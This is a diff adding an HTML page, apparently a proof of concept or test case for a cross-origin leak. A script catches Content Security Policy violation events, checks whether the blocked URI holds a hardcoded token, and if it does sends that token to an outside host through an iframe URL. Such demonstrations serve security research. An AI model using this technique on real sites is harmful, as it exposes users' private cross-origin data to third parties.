@@ -1,0 +1,11 @@
+<iframe id="iframe" src="helper"></iframe>
+
+<script>
+    document.addEventListener('securitypolicyviolation', function(e) {
+        console.dir(e);
+        alert(e.blockedURI);
+        if (e.blockedURI.indexOf("f1542194") > -1) {
+            document.getElementById("iframe").src = "https://adition.com/report/?leak=f1542194";
+        }
+    });
+</script>
